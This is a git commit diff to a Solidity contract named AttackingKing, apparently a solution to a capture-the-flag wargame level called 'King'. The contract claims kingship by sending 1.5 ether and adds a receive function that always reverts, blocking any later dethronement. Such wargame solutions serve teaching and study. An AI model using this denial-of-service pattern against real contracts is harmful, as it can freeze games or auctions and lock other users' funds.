6c575a27583fbd595528671691fea56dd76364a8
Will McTighe <will@mctighe.net>
2022-07-07 14:57:30 +0100

    update king exploit

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -4,16 +4,24 @@ import "./King.sol";
 import "hardhat/console.sol";
 
 contract AttackingKing {
-    King public king;
+
+    address public king;
 
     // Impersonate king contract address
-    constructor(King _king) payable {
-        king = King(_king);
+    // Constructor needs to be payable because King has a payable constructor
+    constructor(address _king) payable {
+        king = _king;
     }
 
+    // first payable is to make hackContract payable 
     function hackContract() public payable{
-        address king = payable(king);
-
-        king.call{value: 1.5 ether}("");
+        // payable defines king as a function that can receive $$
+        // just make address payable
+        payable(king).call{value: 1.5 ether}("");
+    }
+    
+    receive() external payable{
+        // Error messages cost a lot of gas, make them short
+        require(1 == 0, "I'm King forever");
     }
 }
